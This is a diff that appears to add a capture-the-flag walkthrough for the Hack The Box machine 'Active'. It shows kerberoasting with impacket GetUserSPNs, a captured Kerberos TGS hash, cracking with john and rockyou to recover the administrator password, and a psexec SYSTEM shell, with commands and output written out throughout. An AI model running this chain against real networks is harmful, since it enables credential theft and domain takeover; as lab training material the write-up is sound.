@@ -265,3 +265,57 @@ Go to svc_tgs desktop and get user.txt:
 smbclient //10.129.63.188/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
 ````
 Now we go to Privescalation.
+
+We are going to do some kerberoasting. First use getusersspn from impacket to list service usernames that are associated with normal user accounts:
+````
+impacket-GetUserSPNs -request -dc-ip 10.129.64.30 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+````
+````
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 16:06:40.351723  2026-09-02 15:30:01.460563             
+
+
+
+[-] CCache file is not found. Skipping...
+````
+It also got us the hash:
+````
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e9807a2c8de983ed787828bfc473d839$db0aaeaaa9421c9f6424123f6bde3aa8b4d30f14e61042281a107547d53bef0ac86d594a15d58d7df82c1c14b008b289910898a881a163401e8e10ec5f3ef5bcf081024be1b9d90672802628fa714030cf5fe73670f112132a96dc78c3839c07cfad8805ed6d65dfec29a392e3cbcbe064ec9d3e90c9b8a13e61b5b673a80bbe206adb591724efe942fb6a88c2451b04786eb08ed63a3552d0972200b9566c960a3d5d5071637ced038d9191d4e76fd136d2dff57fcb5044669d514929e1d6174acfead0d6b3b57a1a19499a65f7902beca808c718d18f60c75eedf3e627be38ee0a33274f6d9e3cd6f38d9fe278eb44bfddd68ab1fe6feab51d122840082ec273420a1164395f3018eae3622cc5975acf5e808e34fe579478203c115719c6cabc3abefe0469205a9ba937d24040347ee9ff49e665bb55a2ce576b9989e780b56b6590ccbb9eb306ff7a0523bc8a28ad9eba728ca5e355c243004d397524dc00743d4f99138850149ef694d34d8a9e41e152481a9817fbbed659af2d0a06e2517ec832073983e077625724b766e43799476dda102557d98bed268146e4693d04776d42c91df41183ca3b3d9be63b1d55491422c328be924d9c06722b02dc408d6e1201705c73b111f9551dab20491a0956ea21cbd18b0d955782155d48c7565c6b1a1e6bf7fc29e08cc9f41b0f6072a8a0f5a48228f3b43b69a08d2803e764e07587e1a28e3e7b32c900e4d06eb2402107fa702f7c07944883e2296aa7904e89d4c2835206b1d71fe18b7c081cd632586dddc09f4bb84dfa5e5d60c568cabae41a8644a9dbcd65572f73dca01070c09f4f20c1d379b59905cb02fc469f01cd33582e6a3cf1b0ddfcf37e734322653321d56c8ccbb1efd1734e348f59b3fc27da00dbdda7d90736def598b7ddb7928655a898c1b7a721b351a29347c5dc6ad113f35632145e0cb03eb2611a0ef45ef228253e75ac72a963fed87373bb8d8067e517e07ef7c29444768e265c890be4862aa0b7b215462817801ffda9eed9dba7a59b742bb0fcd656eda29b2807f63fe0e092fe6e9b62a94959355b41b0b11df34f92a72473f6da95479e97711d3ec30f70d6ca15c155ee370d764bc1b84d8d39788b476ae726db1990a3e17aadebe0486b3f383471645dcc254dec6c60e2ca7acf8634bdad36137838197dbce586625b104fb0386565d6b92c2e492f6c042706752319233c1ebb30323de6960f709ec892f0c8bb73495b732fba61
+````
+The format of the hash is: krb5tgs. Let's pass it on to john so we ca crack it using rockyou:
+````
+└─# john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt GetUserSPNs.out
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:06 DONE (2026-09-02 15:52) 0.1626g/s 1713Kp/s 1713Kc/s 1713KC/s Tiffani1432..Thrash1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+````
+Ticketmaster1968 is the administrator password.
+Now we jsut need to get a shell using impacket:
+````
+└─# impacket-psexec active.htb/administrator@10.129.64.30
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on 10.129.64.30.....
+[*] Found writable share ADMIN$
+[*] Uploading file dnQHUcNP.exe
+[*] Opening SVCManager on 10.129.64.30.....
+[*] Creating service ZVwo on 10.129.64.30.....
+[*] Starting service ZVwo.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+````
+
